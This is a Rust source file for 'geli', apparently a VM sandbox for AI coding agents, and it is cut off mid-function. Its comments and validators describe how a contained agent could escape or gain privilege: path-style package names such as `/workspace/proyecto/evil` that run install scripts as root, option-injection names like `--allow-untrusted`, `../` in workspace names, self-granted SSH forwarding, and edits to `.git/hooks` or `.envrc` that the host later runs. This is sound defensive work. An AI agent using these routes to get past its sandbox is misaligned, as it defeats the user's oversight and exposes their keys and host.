use clap::Parser;
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::fs::{self, File};
use std::io::{self, BufRead, IsTerminal, Write};
use std::path::{Path, PathBuf};

const LOCAL_CONFIG_FILE: &str = ".geli.json";

#[derive(Parser, Debug)]
#[command(name = "geli", version = "1.0", about = "Secure Sandbox for AI Agents")]
struct Cli {
    /// Show active isolated namespaces registry profiles
    #[arg(long)]
    list: bool,

    /// Build (or rebuild) the base image every sandbox session boots from
    #[arg(long)]
    build_image: bool,

    /// With --build-image: also build these agents' layers now, instead of on first use
    #[arg(long, value_delimiter = ',', value_name = "claude,opencode")]
    agents: Vec<String>,

    /// Do not copy the host's credentials into the sandbox
    #[arg(long)]
    no_credentials: bool,

    /// Let the sandbox sign with the host's SSH agent, without the private key crossing
    #[arg(long)]
    ssh: bool,

    /// Restrict SSH forwarding to one key, by its path on the host
    #[arg(long, value_name = "PATH")]
    ssh_key: Option<PathBuf>,

    /// Copy the SSH private key file into the sandbox instead of forwarding the agent
    ///
    /// The old behaviour of `--ssh`, kept under a name that says what it does. The key is
    /// readable inside the VM and stays valid long after the VM is gone; prefer `--ssh`.
    #[arg(long)]
    ssh_copy_key: bool,

    /// Allow the sandbox to reach only an allowlist of hosts, instead of the whole internet
    #[arg(long)]
    restrict_net: bool,

    /// Command and arguments passed to execute inside the sandbox
    #[arg(trailing_var_arg = true, allow_hyphen_values = true)]
    agent_args: Vec<String>,
}

/// The project's own `.geli.json`: what this directory *declares*, and nothing that grants
/// anything.
///
/// **This file is the agent's output as much as the user's input.** It sits in the project
/// directory, which the sandbox mounts with write access, so whatever the agent writes here the
/// host reads on the next run. It therefore holds exactly one thing — `packages`, already
/// validated by `rejected_package_names`, whose worst case is a package too many inside a VM that
/// is thrown away. Everything that grants something lives in `WorkspaceConfig`, on the host.
///
/// That also makes it committable, which is what `packages` wanted all along: the tools a project
/// needs are a fact about the repository, not about one machine.
#[derive(Serialize, Deserialize, Debug, Default)]
struct LocalConfig {
    /// Tools this project needs inside the sandbox, reinstalled on every boot.
    #[serde(default, skip_serializing_if = "Packages::is_empty")]
    packages: Packages,

    // Fields geli no longer reads. They are still parsed so `migrate_local_config` can move them
    // to the host and strip them from the file; nothing else may look at them.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    workspace: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    allow: Vec<String>,
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    ssh: bool,
}

/// A workspace as the *host* records it: which directories belong to it, and what the user has
/// granted it. Lives in `~/.config/geli/workspaces/<name>.json`, where the sandbox cannot reach.
///
/// `ssh` is here and not in the project file for one reason: an agent credential leaks the
/// account it belongs to, an SSH private key grants write access to every repository the user has
/// and outlives the VM that leaked it. `--ssh` is meant to be a first-party decision, and a flag
/// that a file inside the sandbox can set is not one.
#[derive(Serialize, Deserialize, Debug, Default, Clone)]
struct WorkspaceConfig {
    /// Absolute paths, one per directory. Stale entries are filtered at read time, not pruned.
    #[serde(default)]
    dirs: Vec<PathBuf>,
    /// Forward the host's SSH keys for every session in this workspace.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    ssh: bool,
    /// Extra hosts these directories may reach when `--restrict-net` is on.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    allow: Vec<String>,
    /// Per directory, the digest of the package list the user approved there.
    ///
    /// **Here rather than in the project, which is the whole point.** The list lives in
    /// `.geli.json`, which the sandbox may write; the approval of that list lives where the
    /// sandbox cannot reach. A project that changes its list gets asked again.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    approved_packages: BTreeMap<String, String>,
}

/// Tools a project declares it needs inside the sandbox, by package manager.
///
/// **Declared rather than accumulated.** The alternative was keeping the session's root overlay so
/// that whatever the agent installed survived; that was rejected (`docs/history-management.md`
/// appendix C) because the overlay dies with its agent layer, the VM stops being fresh, and
/// nobody can say what is inside it or why. A list costs a line and survives a rebuild.
///
/// What it does not cover, deliberately: anything the agent installed without anyone writing it
/// down is gone next session.
#[derive(Serialize, Deserialize, Debug, Default, Clone, PartialEq)]
pub(crate) struct Packages {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub(crate) apk: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub(crate) npm: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub(crate) pip: Vec<String>,
}

impl Packages {
    pub(crate) fn is_empty(&self) -> bool {
        self.apk.is_empty() && self.npm.is_empty() && self.pip.is_empty()
    }

    /// Every name, tagged with the manager that would install it. Used for both the status block
    /// and the validation pass, so neither can look at a different set than the other.
    fn listed(&self) -> impl Iterator<Item = (&'static str, &String)> {
        [("apk", &self.apk), ("npm", &self.npm), ("pip", &self.pip)]
            .into_iter()
            .flat_map(|(manager, names)| names.iter().map(move |n| (manager, n)))
    }
}

/// Characters a package name may contain whatever installs it. Everything a shell would read as
/// syntax is absent: no spaces, no `;`, `|`, `&`, `$`, backticks, quotes, newlines, and no `<` or
/// `>` — which rules out apk's and pip's `>=` version constraints along with redirection, since no
/// charset can tell them apart. `=` survives, so `ripgrep=14.1.0` still works.
///
/// **This matters because `.geli.json` is not a trusted file.** It lives in the project
/// directory, so it can arrive inside a cloned repository, and these names go into a root shell.
fn valid_package_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/' | '=')
}

/// Whether a manager would read this name as a **place** rather than a package.
///
/// **This, not shell syntax, is what the charset above was missing.** The names are shell-quoted
/// before they reach the guest, so `;` was never getting through. What was getting through is
/// `npm install -g /workspace/proyecto/evil`: a local path, whose install script runs **as root
/// and before the lockdown exists**, because declared packages go in while there is still a route
/// (`build_package_setup`, and the ordering comment in `build_mount_script`). The agent can write
/// `.geli.json` — that is deliberate, it is how a session hands work to the next one — so a path
/// here is a way to leave root waiting for tomorrow. `CLAUDE.md` says nothing in that file may
/// grant anything; this is what made that false.
/// → `docs/plans/10-paquetes-token-y-lo-que-no-se-puede-comprobar.md`
fn looks_like_a_path(name: &str) -> bool {
    name.starts_with('.')
        || name.starts_with('/')
        || name.starts_with('~')
        || name.contains("..")
        || name.contains('/')
        || looks_like_an_archive(name)
}

/// Whether a name with no slash in it would still be read as a file.
///
/// npm takes `x.tgz` and pip takes `x.whl` as something to install from disk, resolved against
/// the working directory. The install runs from `/`, where the agent cannot write, so today this
/// is already harmless — **but that is a property of where the script stands, not of what the
/// name is allowed to be**, and the two should not be the same argument. One of them is checked
/// here; the other is a `cd /` in the mount script, and both are cheap.
fn looks_like_an_archive(name: &str) -> bool {
    let lower = name.to_ascii_lowercase();
    [".tgz", ".tar", ".tar.gz", ".whl", ".zip"].iter().any(|ext| lower.ends_with(ext))
}

/// Whether `manager` would accept this name as the name of a package.
///
/// **One rule per manager, because they do not want the same thing.** npm genuinely needs a slash
/// — `@scope/name` is how half of npm is published — and it is the only one that does, so it is
/// the only one that gets it, and only in that shape. apk and pip never need one, so for them a
/// slash is always someone trying to install a directory.
fn valid_package_name(manager: &str, name: &str) -> bool {
    if name.is_empty() || !name.chars().all(valid_package_char) {
        return false;
    }
    // A name starting with `-` is not a package, it is an option: each entry becomes its own
    // argument, so `--allow-untrusted` would reach apk as a flag rather than as something to
    // install. No package manager has a package whose name starts with a dash.
    if name.starts_with('-') {
        return false;
    }

    match manager {
        // `@scope/name`: one leading `@`, one slash, something on each side of it. Checked as a
        // whole shape rather than character by character, which is what lets the slash in without
        // letting `./x` or `a/../b` in with it.
        "npm" => match name.strip_prefix('@') {
            Some(scoped) => match scoped.split_once('/') {
                Some((scope, rest)) => {
                    !scope.is_empty() && !rest.is_empty() && !looks_like_a_path(scope)
                        && !looks_like_a_path(rest)
                }
                None => !looks_like_a_path(scoped),
            },
            None => !looks_like_a_path(name),
        },
        _ => !looks_like_a_path(name),
    }
}

/// A digest of exactly the package list, and nothing else about the project.
///
/// **SHA-256 rather than the `DefaultHasher` `recipe_hash` uses.** That one answers "did this
/// change", where a collision costs a needless rebuild. This one answers "did the user agree to
/// this", where a collision is a hostile list wearing an approved list's name. `sha2` is already
/// in the tree — `ssh-key` re-exports it — so the stronger answer is free.
///
/// Order and duplicates are normalised away: a list someone reordered is the same list, and asking
/// again for it would teach the user to say yes without reading.
fn packages_digest(packages: &Packages) -> String {
    use ssh_key::sha2::{Digest, Sha256};

    let mut hasher = Sha256::new();
    for (manager, names) in [("apk", &packages.apk), ("npm", &packages.npm), ("pip", &packages.pip)]
    {
        let mut sorted: Vec<&str> = names.iter().map(String::as_str).collect();
        sorted.sort_unstable();
        sorted.dedup();
        for name in sorted {
            // Length-prefixed, so ["ab","c"] and ["a","bc"] cannot hash alike.
            hasher.update(manager.as_bytes());
            hasher.update(b"\0");
            hasher.update((name.len() as u64).to_be_bytes());
            hasher.update(name.as_bytes());
        }
    }
    format!("{:x}", hasher.finalize())
}

/// The declared names geli will not install, in the order they were written.
fn rejected_package_names(packages: &Packages) -> Vec<String> {
    packages
        .listed()
        .filter(|(manager, name)| !valid_package_name(manager, name))
        .map(|(manager, name)| format!("{}: {}", manager, name))
        .collect()
}

/// Prints the error itself rather than letting `Result`'s `Debug` do it: the default renders an
/// `io::Error` as `Custom { kind: Other, error: "..." }`, which buries the sentence someone has to
/// read. Exiting here is safe — every session guard has already been dropped by the time `run`
/// returns.
fn main() {
    if let Err(e) = run() {
        eprintln!("[!] {}", e);
        std::process::exit(1);
    }
}

fn run() -> io::Result<()> {
    let args = Cli::parse();

    // Every invocation, before anything else — including `--list`, which is often the one people
    // run when something went wrong. The leftovers being cleared belong to runs that never got
    // to end: a session killed by SIGHUP or SIGKILL skips `SessionScratch`'s `Drop`, so this is
    // the only thing that ever collects those. It only touches names whose pid is gone, which is
    // what keeps it safe while other sessions are running.
    #[cfg(target_os = "linux")]
    qemu::sweep_dead_sessions();

    if args.list {
        display_active_workspaces()?;
        return Ok(());
    }

    if args.build_image {
        return build_images(&args.agents);
    }

    if args.agent_args.is_empty() {
        eprintln!("Error: No execution command specified.");
        eprintln!("Usage: geli <command> [args...]");
        std::process::exit(1);
    }

    let current_dir = std::env::current_dir()?;
    let mut local = read_local_config(&current_dir)?.unwrap_or_default();
    let migration = migrate_local_config(&current_dir, &mut local)?;
    let (workspace_name, mut workspace) = resolve_workspace(&current_dir, &migration)?;

    let command_to_run = build_guest_command(&args.agent_args);

    // Offered once per workspace: the answer goes to the registry, so the next session in any of
    // its directories already knows.
    if args.ssh && !workspace.ssh && io::stdin().is_terminal() {
        prompt_enable_persistent_ssh(&workspace_name, &mut workspace)?;
    }
    let forward_ssh = !args.no_credentials && (args.ssh || workspace.ssh || args.ssh_key.is_some());
    let ssh_mode = if !forward_ssh {
        SshMode::Off
    } else if args.ssh_copy_key {
        SshMode::CopyKey
    } else {
        SshMode::Agent
    };

    execute_sandbox(
        &workspace_name,
        &current_dir,
        workspace.dirs.clone(),
        &command_to_run,
        &local.packages,
        &SessionPolicy {
            credentials: !args.no_credentials,
            ssh: ssh_mode,
            ssh_key: args.ssh_key.as_deref(),
            restrict_net: args.restrict_net,
            allow: &workspace.allow,
        },
    )?;
    Ok(())
}

pub(crate) fn dirs_home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .or_else(|| std::env::var_os("USERPROFILE").map(PathBuf::from))
}

fn get_config_dir() -> PathBuf {
    let mut path = dirs_home_dir().unwrap_or_else(|| PathBuf::from("."));
    path.push(".config");
    path.push("geli");
    path.push("workspaces");
    path
}

/// Paths inside a mounted project that the **host** will execute once the session is over.
///
/// **This is the hole the sandbox cannot close, so the least it can do is not be quiet about
/// it.** geli's threat model is that the agent cannot touch files it was not given. These were
/// given to it — they are inside the project it is supposed to work on — and the host runs them
/// outside any sandbox: `git commit` fires `.git/hooks/pre-commit`, entering the directory fires
/// `.envrc`, opening the editor fires `tasks.json`. `core.hooksPath` and `core.fsmonitor` in
/// `.git/config` do the same thing a level of indirection away.
///
/// Mounting `.git/hooks` read-only was considered and rejected: it breaks `git commit` in every
/// repository with husky or pre-commit installed, which is most of them, and closes one of six
/// routes. Naming what changed costs nothing and leaves the decision where it belongs.
const HOST_EXECUTED_PATHS: &[&str] =
    &[".git/hooks", ".git/config", ".envrc", ".vscode/tasks.json"];

/// A content fingerprint of every `HOST_EXECUTED_PATHS` entry across the mounted directories,
/// keyed by a path to show the user. Directories are walked so the report can name the one file
/// that changed rather than the tree it sits in.
fn fingerprint_host_executed(dirs: &[PathBuf]) -> BTreeMap<String, u64> {
    fn hash_bytes(bytes: &[u8]) -> u64 {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};
        let mut hasher = DefaultHasher::new();
        bytes.hash(&mut hasher);
        hasher.finish()
    }

    fn visit(path: &Path, label: &str, out: &mut BTreeMap<String, u64>) {
        match fs::metadata(path) {
            // Absent is not a change by itself; `changed_paths` compares the two sides.
            Err(_) => {}
            Ok(meta) if meta.is_dir() => {
                let Ok(entries) = fs::read_dir(path) else { return };
                for entry in entries.flatten() {
                    let name = entry.file_name().to_string_lossy().into_owned();
                    visit(&entry.path(), &format!("{}/{}", label, name), out);
                }
            }
            Ok(_) => {
                if let Ok(bytes) = fs::read(path) {
                    out.insert(label.to_string(), hash_bytes(&bytes));
                }
            }
        }
    }

    let mut out = BTreeMap::new();
    let named = dirs.len() > 1;
    for dir in dirs {
        let prefix = match (named, dir.file_name()) {
            (true, Some(name)) => format!("{}/", name.to_string_lossy()),
            _ => String::new(),
        };
        for watched in HOST_EXECUTED_PATHS {
            visit(&dir.join(watched), &format!("{}{}", prefix, watched), &mut out);
        }
    }
    out
}

/// What the session added, changed or removed. Pure, so the reporting is testable without a VM.
fn changed_paths(before: &BTreeMap<String, u64>, after: &BTreeMap<String, u64>) -> Vec<String> {
    let mut changed: Vec<String> = after
        .iter()
        .filter(|(path, hash)| before.get(*path) != Some(hash))
        .map(|(path, _)| path.clone())
        .collect();
    changed.extend(before.keys().filter(|p| !after.contains_key(*p)).cloned());
    changed.sort();
    changed.dedup();
    changed
}

/// Workspace names become filenames under `~/.config/geli/workspaces/` and the guest's hostname,
/// so they are reduced to lowercase alphanumerics plus `-`.
///
/// **This runs on a name migrated out of `.geli.json` too, not just the one typed at the
/// prompt.** That file lives in the project directory, which the sandbox mounts with write
/// access, so its contents are the agent's output as much as the user's input — and an
/// unsanitized name went straight into the path the registry file is written to, where `../`
/// escapes the registry.
pub(crate) fn sanitize_workspace_name(raw: &str) -> String {
    raw.trim().to_lowercase().replace(|c: char| !c.is_alphanumeric() && c != '-', "")
}

/// Read the project's `.geli.json`, or `None` when the project has none yet.
///
/// **Malformed JSON is an error, not an empty config.** The three readers this replaced each
/// swallowed a parse failure into a default, so a typo silently dropped the project's packages
/// while `get_or_create_workspace` — reading the same file — failed loudly. Worse,
/// `save_local_packages` would then overwrite the unparseable file with that default and take the
/// rest of its contents with it.
fn read_local_config(current_dir: &Path) -> io::Result<Option<LocalConfig>> {
    let raw = match fs::read_to_string(current_dir.join(LOCAL_CONFIG_FILE)) {
        Ok(raw) => raw,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e),
    };
    serde_json::from_str(&raw).map(Some).map_err(|e| {
        io::Error::new(
            io::ErrorKind::InvalidData,
            format!("{} in {}: {}", LOCAL_CONFIG_FILE, current_dir.display(), e),
        )
    })
}

/// What a `.geli.json` written by an older geli had to say, once its privileged fields have been
/// taken out of it.
#[derive(Debug, Default, PartialEq)]
struct Migration {
    /// The workspace it claimed to belong to, sanitized. A hint for the registry, not a grant.
    workspace: Option<String>,
    /// Extra allowlist entries, carried over.
    allow: Vec<String>,
    /// Whether it asked for SSH forwarding — recorded so the user can be told, never honoured.
    asked_for_ssh: bool,
}

impl Migration {
    fn is_empty(&self) -> bool {
        self.workspace.is_none() && self.allow.is_empty() && !self.asked_for_ssh
    }
}

/// Take the privileged fields out of a `.geli.json` written by an older geli.
///
/// **`ssh` is reported and dropped, never carried over.** It is the one field that hands private
/// keys to the sandbox, and importing it from a file the agent could have written would bless the
/// agent's decision as the host's — which is exactly the hole this split closes. `workspace` and
/// `allow` do move: the first is already mirrored in the registry by every previous run, and the
/// second only widens an allowlist the user opted into with `--restrict-net`.
///
/// Pure except for the caller's write: it reports what to do and leaves the file to `strip`.
fn plan_migration(config: &LocalConfig) -> Migration {
    Migration {
        workspace: config
            .workspace
            .as_deref()
            .map(sanitize_workspace_name)
            .filter(|n| !n.is_empty()),
        allow: config.allow.clone(),
        asked_for_ssh: config.ssh,
    }
}

fn migrate_local_config(current_dir: &Path, config: &mut LocalConfig) -> io::Result<Migration> {
    let migration = plan_migration(config);
    if migration.is_empty() {
        return Ok(migration);
    }

    config.workspace = None;
    config.allow = Vec::new();
    config.ssh = false;
    if config.packages.is_empty() {
        // Nothing left to declare. A `{}` in every project is a file people would have to learn
        // to ignore; the registry already knows where this directory belongs.
        fs::remove_file(current_dir.join(LOCAL_CONFIG_FILE))?;
    } else {
        write_local_config(current_dir, config)?;
    }

    eprintln!("[*] {} held settings geli no longer reads from a project.", LOCAL_CONFIG_FILE);
    if let Some(ws) = &migration.workspace {
        eprintln!("    workspace '{}' and any allowlist moved to ~/.config/geli/.", ws);
    } else if !migration.allow.is_empty() {
        eprintln!("    its allowlist moved to ~/.config/geli/.");
    }
    if migration.asked_for_ssh {
        eprintln!(
            "    It also asked for SSH forwarding. That is NOT carried over: a file inside the\n\
             \x20   sandbox must not be able to send your private keys in. Run `geli --ssh <cmd>`\n\
             \x20   once to grant it to this workspace yourself."
        );
    }
    Ok(migration)
}

fn write_local_config(current_dir: &Path, config: &LocalConfig) -> io::Result<()> {
    let path = current_dir.join(LOCAL_CONFIG_FILE);
    let file = File::create(&path)?;
    serde_json::to_writer_pretty(file, config).map_err(io::Error::other)
}

/// The packages a session installed, read back out of the boot console log.
///
/// **Everything here is a proposal from inside the sandbox, not a fact about it.** `/dev/ttyS1` is
/// world-writable so the guest can leave its readiness breadcrumb, which means the agent can
/// print these lines too. So a name that is not a name is dropped here, and nothing reaches
/// `.geli.json` without the user agreeing to it by hand.
pub(crate) fn parse_installed_packages(log: &str) -> Packages {
    let mut found = Packages::default();

    for line in log.lines() {
        let Some(at) = line.find(INSTALLED_MARKER) else { continue };
        let mut parts = line[at + INSTALLED_MARKER.len()..].split_whitespace();
        let (Some(manager), Some(name), None) = (parts.next(), parts.next(), parts.next()) else {
            continue;
        };
        // The manager decides what a name may look like, so it is read first. A discovery that
        // would be refused on the way in must not get in by this door either: what lands here is
        // offered for `.geli.json`, which is where the next session reads it from.
        let list = match manager {
            "apk" => &mut found.apk,
            "npm" => &mut found.npm,
            "pip" => &mut found.pip,
            _ => continue,
        };
        if !valid_package_name(manager, name) {
            continue;
        }
        // The guest already sorts and uniques, but a log can be read twice and a line can repeat.
        if !list.iter().any(|p| p == name) {
            list.push(name.to_string());
        }
    }

    found
}

/// What was installed and is not already written down. Declaring a package must not make it
/// show up as a discovery on every later run.
fn undeclared_packages(found: &Packages, declared: &Packages) -> Packages {
    let strip = |found: &Vec<String>, declared: &Vec<String>| -> Vec<String> {
        found.iter().filter(|p| !declared.contains(p)).cloned().collect()
    };
    Packages {
        apk: strip(&found.apk, &declared.apk),
        npm: strip(&found.npm, &declared.npm),
        pip: strip(&found.pip, &declared.pip),
    }
}

/// A `select` answer: 1-based indices, separated by commas or spaces.
///
/// One bad entry invalidates the whole answer rather than being dropped quietly. Someone typing
/// `1 4` for a list of three means something by the `4`, and silently persisting only `1` is the
/// kind of help nobody asked for.
fn parse_selection(answer: &str, count: usize) -> Option<Vec<usize>> {
    let mut picked = Vec::new();
    for token in answer.split([',', ' ']).filter(|t| !t.trim().is_empty()) {
        let n: usize = token.trim().parse().ok()?;
        if n == 0 || n > count {
            return None;
        }
        if !picked.contains(&(n - 1)) {
            picked.push(n - 1);
        }
    }
    (!picked.is_empty()).then_some(picked)
}

/// Ask once per package manager whether to write what the session installed into `.geli.json`.
///
/// On **stderr**, like the rest of what geli says about itself: this runs after the command has
/// finished, and `geli claude > out.txt` must still capture the command and nothing else.
fn offer_to_persist_packages(
    workspace: &str,
    current_dir: &Path,
    declared: &Packages,
    log: &str,
) -> io::Result<()> {
    let found = undeclared_packages(&parse_installed_packages(log), declared);
    if found.is_empty() {
        return Ok(());
    }

    let groups = [("apk", &found.apk), ("npm", &found.npm), ("pip", &found.pip)];

    // Not a terminal: say what happened and stop. Prompting into a pipe would either hang or
    // read someone else's input, and a CI log should still show what the session added.
    if !io::stdin().is_terminal() {
        for (manager, names) in groups {
            if !names.is_empty() {
                eprintln!(
                    "geli · this session installed {} {}: {}",
                    names.len(),
                    manager,
                    names.join(" ")
                );
            }
        }
        eprintln!("geli · add them under \"packages\" in .geli.json to keep them.");
        return Ok(());
    }

    let mut keep = declared.clone();
    let mut changed = false;

    for (manager, names) in groups {
        if names.is_empty() {
            continue;
        }

        eprintln!("\ngeli · this session installed {} packages not in .geli.json:", manager);
        for (i, name) in names.iter().enumerate() {
            eprintln!("    {}. {}", i + 1, name);
        }
        eprint!("[?] Keep them for next time? (a)ll / (s)elect / (N)one: ");
        io::stderr().flush()?;

        let mut answer = String::new();
        io::stdin().lock().read_line(&mut answer)?;

        let chosen: Vec<String> = match answer.trim().to_lowercase().as_str() {
            "a" | "all" => names.to_vec(),
            "s" | "select" => {
                eprint!("[?] Which? (numbers, e.g. 1 3): ");
                io::stderr().flush()?;
                let mut picks = String::new();
                io::stdin().lock().read_line(&mut picks)?;
                match parse_selection(&picks, names.len()) {
                    Some(indices) => indices.into_iter().map(|i| names[i].clone()).collect(),
                    None => {
                        eprintln!("[!] Not a valid selection; keeping none of the {}.", manager);
                        Vec::new()
                    }
                }
            }
            _ => Vec::new(),
        };

        if chosen.is_empty() {
            continue;
        }
        changed = true;
        let target = match manager {
            "apk" => &mut keep.apk,
            "npm" => &mut keep.npm,
            _ => &mut keep.pip,
        };
        target.extend(chosen);
    }

    if changed {
        save_local_packages(current_dir, &keep)?;
        // The user just said yes to these, one by one. Leaving the approval behind would ask
        // again next session for the very list they chose here, and a question that always fires
        // is a question people stop reading.
        remember_package_approval(workspace, current_dir, &keep)?;
        eprintln!("[+] Saved to .geli.json. The next session installs them before the agent runs.");
    }

    Ok(())
}

/// Record that the user agreed to this exact list for this directory.
///
/// In the registry, never in the project: an approval a project could write for itself is not an
/// approval. Missing workspace or unreadable registry is not fatal — the worst case is being
/// asked again, and refusing to run over it would be worse than the question.
fn remember_package_approval(workspace: &str, dir: &Path, packages: &Packages) -> io::Result<()> {
    let mut config = read_workspace(workspace)?.unwrap_or_default();
    config
        .approved_packages
        .insert(approval_key(dir), packages_digest(packages));
    write_workspace(workspace, &config)
}

/// How a directory is named in the approval map. Canonical where possible, so the same project
/// reached through a symlink is the same project.
fn approval_key(dir: &Path) -> String {
    dir.canonicalize().unwrap_or_else(|_| dir.to_path_buf()).display().to_string()
}

/// The declared packages, once the user has said they are theirs.
///
/// **The list is in the project; the approval is not.** `.geli.json` is mounted writable on
/// purpose — it is how a session hands work to the next one — so a package list is a proposal
/// from inside the sandbox as much as from the user. The validator stops a name that is a path or
/// an option; this stops the ordinary-looking name nobody chose. They are different holes: one is
/// a shape, this one is consent.
///
/// Not a terminal means **not installing**, and saying so. Prompting into a pipe would hang or
/// read someone else's keystrokes, and silently installing instead would make the gate decorative
/// in exactly the place — CI — where nobody is watching.
fn approved_packages(workspace: &str, dir: &Path, declared: &Packages) -> io::Result<Packages> {
    if declared.is_empty() {
        return Ok(Packages::default());
    }

    let digest = packages_digest(declared);
    let config = read_workspace(workspace)?.unwrap_or_default();
    if config.approved_packages.get(&approval_key(dir)).is_some_and(|seen| *seen == digest) {
        return Ok(declared.clone());
    }

    eprintln!("\ngeli · {} declares packages this workspace has not approved:", LOCAL_CONFIG_FILE);
    for (manager, name) in declared.listed() {
        eprintln!("    {} {}", manager, name);
    }
    // Accurate about who installs them, because that is the thing being consented to: apk is
    // root and Alpine-signed, npm and pip run as the agent's own user.
    eprintln!("    apk installs as root; npm and pip install as the agent's user.");
    eprintln!("    All of them run before the sandbox loses its network.");

    if !io::stdin().is_terminal() {
        eprintln!("geli · not a terminal, so they are skipped. Run geli here once to approve.");
        return Ok(Packages::default());
    }

    eprint!("[?] Install them in this workspace from now on? (y/N): ");
    io::stderr().flush()?;
    let mut answer = String::new();
    io::stdin().lock().read_line(&mut answer)?;

    if !matches!(answer.trim().to_lowercase().as_str(), "y" | "yes") {
        eprintln!("geli · skipped. The session runs without them.");
        return Ok(Packages::default());
    }

    remember_package_approval(workspace, dir, declared)?;
    Ok(declared.clone())
}

/// Merge a package set into the project's `.geli.json`, leaving every other field alone.
fn save_local_packages(current_dir: &Path, packages: &Packages) -> io::Result<()> {
    let mut config = read_local_config(current_dir)?.unwrap_or_default();
    config.packages = packages.clone();
    write_local_config(current_dir, &config)
}

/// **Asks on stderr, like every other prompt.** stdout belongs to the command, so a question
/// written there lands in the file under `geli claude > out.txt` and the user watches a terminal
/// that looks hung, waiting to answer something they cannot see.
fn prompt_enable_persistent_ssh(workspace: &str, config: &mut WorkspaceConfig) -> io::Result<bool> {
    eprint!("[?] Enable SSH forwarding permanently for workspace '{}'? (y/N): ", workspace);

    let mut choice = String::new();
    io::stdin().lock().read_line(&mut choice)?;
    let trimmed = choice.trim().to_lowercase();

    if trimmed == "y" || trimmed == "yes" {
        config.ssh = true;
        write_workspace(workspace, config)?;
        eprintln!(
            "[+] Saved to ~/.config/geli/workspaces/{}.json, where the sandbox cannot reach it.\n",
            workspace
        );
        return Ok(true);
    }

    Ok(false)
}

/// The workspace this directory belongs to, and what the user has granted it.
///
/// **The registry is the only source of truth for this now.** `.geli.json` used to carry the
/// workspace name inside the repository, which was convenient — a clone arrived knowing where it
/// belonged — and that convenience was the hole: whoever writes in the repository decides the
/// assignment, and inside the VM that is the agent. So the binding is looked up by asking which
/// workspace already lists this directory, and a directory in none of them is a first run.
///
/// A clone therefore gets asked once. That is the price, and it is the right one.
fn resolve_workspace(
    current_dir: &Path,
    migration: &Migration,
) -> io::Result<(String, WorkspaceConfig)> {
    let name = match workspace_for_dir(current_dir)? {
        Some(found) => found,
        // A migrated `.geli.json` names the workspace this directory used to be in. Honouring it
        // is what keeps the registry rebuilding itself instead of asking once per directory.
        None => match &migration.workspace {
            Some(claimed) => claimed.clone(),
            None => prompt_for_workspace()?,
        },
    };

    let mut config = read_workspace(&name)?.unwrap_or_default();
    if !config.dirs.iter().any(|d| d == current_dir) {
        config.dirs.push(current_dir.to_path_buf());
    }
    for host in &migration.allow {
        if !config.allow.contains(host) {
            config.allow.push(host.clone());
        }
    }
    write_workspace(&name, &config)?;

    // Stale entries are filtered for the caller but left on disk: a directory on an unmounted
    // volume is not the same thing as one that was removed from the workspace.
    config.dirs.retain(|d| d.exists());
    Ok((name, config))
}

fn prompt_for_workspace() -> io::Result<String> {
    eprintln!("[-] This directory does not belong to a sandbox workspace yet.");
    eprintln!("[?] How would you like to namespace this folder?");
    eprintln!("------------------------------------------------");

    let existing = workspace_names()?;
    let mut ws_name = String::new();
    let stdin = io::stdin();

    if !existing.is_empty() {
        for (i, ws) in existing.iter().enumerate() {
            eprintln!("  {}) Add to existing workspace: [{}]", i + 1, ws);
        }
        eprintln!("  n) Create a BRAND NEW workspace");
        eprintln!("------------------------------------------------");

        eprint!("Select an option (1-{} or n): ", existing.len());

        let mut choice = String::new();
        stdin.lock().read_line(&mut choice)?;
        if let Ok(num) = choice.trim().parse::<usize>() {
            if num > 0 && num <= existing.len() {
                ws_name = existing[num - 1].clone();
            }
        }
    } else {
        eprintln!("  (No existing workspaces found. Let's create your first one!)");
        eprintln!("------------------------------------------------");
    }

    if ws_name.is_empty() {
        eprint!("Enter a name for this workspace: ");
        let mut new_name = String::new();
        stdin.lock().read_line(&mut new_name)?;
        ws_name = sanitize_workspace_name(&new_name);
    }

    // A name that sanitizes to nothing would become `.json` in the registry and an empty hostname.
    if ws_name.is_empty() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "a workspace name must hold letters, digits or '-'",
        ));
    }
    Ok(ws_name)
}

fn workspace_path(name: &str) -> PathBuf {
    get_config_dir().join(format!("{}.json", name))
}

fn read_workspace(name: &str) -> io::Result<Option<WorkspaceConfig>> {
    let raw = match fs::read_to_string(workspace_path(name)) {
        Ok(raw) => raw,
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e),
    };
    serde_json::from_str(&raw).map(Some).map_err(|e| {
        io::Error::new(
            io::ErrorKind::InvalidData,
            format!("{}: {}", workspace_path(name).display(), e),
        )
    })
}

fn write_workspace(name: &str, config: &WorkspaceConfig) -> io::Result<()> {
    let config_dir = get_config_dir();
    fs::create_dir_all(&config_dir)?;
    let file = File::create(workspace_path(name))?;
    serde_json::to_writer_pretty(file, config).map_err(io::Error::other)
}

/// Every workspace the registry knows, sorted so the prompt's numbering does not depend on the
/// filesystem's directory order.
///
/// **`<name>.json` is the only format there has ever been, as far as this code is concerned.**
/// The one-path-per-line `.txt` registry it replaced is not read and not mentioned: geli had one
/// user when the format changed, so every such file was on one machine and was deleted by hand.
/// Anything else — a reader, or a line telling the user to clean up — would be transition code
/// written for nobody, which is how a codebase ends up carrying a decade of other people's
/// migrations.
fn workspace_names() -> io::Result<Vec<String>> {
    let config_dir = get_config_dir();
    if !config_dir.exists() {
        return Ok(Vec::new());
    }

    let mut names = Vec::new();
    for entry in fs::read_dir(&config_dir)? {
        let path = entry?.path();
        if path.extension().and_then(|s| s.to_str()) != Some("json") {
            continue;
        }
        if let Some(stem) = path.file_stem().and_then(|s| s.to_str()) {
